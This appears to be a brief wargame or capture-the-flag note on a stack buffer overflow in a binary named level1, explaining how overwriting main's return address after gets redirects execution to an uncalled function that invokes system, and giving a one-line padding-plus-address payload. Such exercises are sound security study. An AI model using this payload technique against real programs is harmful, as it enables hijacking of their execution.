## Exploit type: buffer overflow to redirect code exec

with objdump -d -M intel level1  we see run function pas not called by main
run has call to system, which is syscall to launch command. That should get us
to next lv. What we have to do is to overwrite return adress of gets in main
to go to run


echo $(python -c 'print 76 * "A" + "\x44\x84\x04\x08"') > /tmp/exploit !! be carefull endianness
